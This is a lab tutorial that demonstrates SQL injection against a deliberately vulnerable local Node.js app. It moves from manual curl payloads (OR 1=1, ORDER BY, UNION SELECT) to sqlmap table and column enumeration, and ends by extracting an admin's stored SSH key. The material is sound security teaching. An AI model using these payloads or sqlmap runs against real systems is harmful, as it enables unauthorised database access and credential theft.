# Lab Overview

In this lab, we will demonstrate the use of `sqlmap` (a popular Kali tool for SQLi)

## Requirements

This tutorial requires you have Kali Linux and an elementary understanding of SQLi

## Mission

Given an endpoint, http://localhost:3000/authenticate/{username}, as provided by [ta git repooo],
we must find a way to acquire the admin user's secret ssh key. It's stored in the database, but
we don't know where.

If at any point you are stuck and don't want to read ahead in this guide for spoilers, a braver
alternative is to read the source code of the web app and try a whitebox approach to finding
the vulnerabilities.

# How to download / run the app

Run these commands to run the server:

```
sudo apt-get install -y nodejs npm
git clone https://github.com/lilahadeline/sqlmap-poc.git & cd sqlmap-poc
npm install
node index.js
```

# Hunting for SQLi

Before we get started, let's look at how we are supposed to interact with this application
according to the instructions provided in the README:

```
$ curl http://localhost:3000/authenticate/funguy -X POST --data '&password=mypass'  
{"username":"funguy","password":"mypass"}
```

So the username (in this case `funguy`) is provided in the URL, and the password is provided
as the POST body. Great!

First, we'll do a quick manual sanity check to see if any of the parameters are injectable.
Let's try the oldest trick in the book, testing unescaped quotation. Our goal is to snatch
the SSH key of `admin`, but since we don't know what the column name for the SSH key is
in the database, for now we'll just try stealing another user's password via injection

Instead of passing our password, which is `mypass`, we'll try passing `mypass' OR 1=1--`.

```
$ curl http://localhost:3000/authenticate/funguy -X POST --data "&password=mypass' OR 1=1--"
{"username":"funguy","password":"mypass"}
```

The query works, implying that the additional SQL code executed just fine! However, it still gives
us the same user as before. Hmm, let's try reversing the order using SQL's `ORDER BY` keyword:

```
curl http://localhost:3000/authenticate/funguy -X POST --data "&password=mypass' OR 1=1 ORDER BY username ASC--" 
{"username":"admin","password":"iLuv2Code"}
```

Great! So we can get the username and password for admin. But remember, we want the SSH key! We just need to know the column name. If there was only a tool to help us...

# Mapping the DBMS with SQLMap

sqlmap is a tool provided with Kali Linux that helps us find out information about an SQL DBMS and
facilitate SQL injection. Let's try to use it to get the missing column name. First, we need to get the name of the table which contains the missing column with our coveted secret:

```
python3 sqlmap.py -u 'http://localhost:3000/authenticate/admin' --method=POST -p 'password' --data='password=ssd' --tables --level=3 --risk=3
[23:30:51] [INFO] the back-end DBMS is SQLite
web application technology: Express
back-end DBMS: SQLite
[23:30:51] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[1 table]
+-------+
| users |
+-------+
```

Great, now that we know the table name is `users`, we can find the column names:

```
sqlmap-dev % python3 sqlmap.py -u 'http://localhost:3000/authenticate/admin' --method=POST -p 'password' --data='password=' -T users --columns --level=3 --risk=3
...
[23:37:23] [INFO] fetching columns for table 'users' 
Database: <current>
Table: users
[3 columns]
+----------+------+
| Column   | Type |
+----------+------+
| password | TEXT |
| ssh_key  | TEXT |
| username | TEXT |
+----------+------+
```

# Exploiting

Now that we know that the missing column is called `ssh_key`. Now we can use a simple `UNION` to get the ssh_key
instead of the password via the payload `' UNION SELECT username, ssh_key FROM users WHERE username='admin';--'`, like so:

```
curl http://localhost:3000/authenticate/funguy -X POST --data "&password=' UNION SELECT username, ssh_key FROM users WHERE username='admin';--'"
{"username":"admin","password":"dGhpcyBpcyB0b3RhbGx5IGxlZ2l0IGJybw=="}
